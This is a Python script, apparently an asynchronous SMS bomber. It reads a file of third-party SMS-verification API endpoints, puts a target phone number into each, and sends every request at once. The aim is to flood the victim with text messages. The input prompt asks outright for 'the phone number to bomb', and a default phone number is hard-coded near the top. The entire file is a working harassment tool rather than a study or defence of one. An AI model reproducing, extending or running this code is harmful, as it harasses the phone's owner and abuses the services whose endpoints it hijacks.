# encoding=utf8
# 短信发送异步版.....
import asyncio
import json
import pathlib
import sys

import httpx
from loguru import logger
from urllib3 import disable_warnings
from typing import List
from utils import API, default_header

disable_warnings()

# logger config
logger.remove()
logger.add(
    sink=sys.stdout,
    format="<green>{time:YYYY-MM-DD at HH:mm:ss}</green> - <level>{level}</level> - <level>{message}</level>",
    colorize=True,
    backtrace=True
)
# current directory
path = pathlib.Path(__file__).parent

phone = "19820294267"


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        return None

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            return None


async def rqs(api: API):
    async with httpx.AsyncClient(headers=default_header) as c:
        try:
            if isinstance(api.data, dict):
                resp = await c.request(method=api.method, url=api.url, json=api.data, headers=api.header)
            else:
                resp = await c.request(method=api.method, url=api.url, data=api.data, headers=api.header)
            logger.success(f"{api.desc}-请求成功-{resp.text}")
        except httpx.HTTPError as why:
            logger.error(f"{api.desc}-请求错误-{why}")


@logger.catch
async def main():
    APIs = load_json()
    if APIs is None:
        return
    # 接收一个元组需要用 * 传参
    await asyncio.gather(
        *(rqs(api.handle_API(phone))
          for api in APIs)
    )



if __name__ == "__main__":
    phone = input(">>需要轰炸的手机号码:")
    asyncio.run(main())
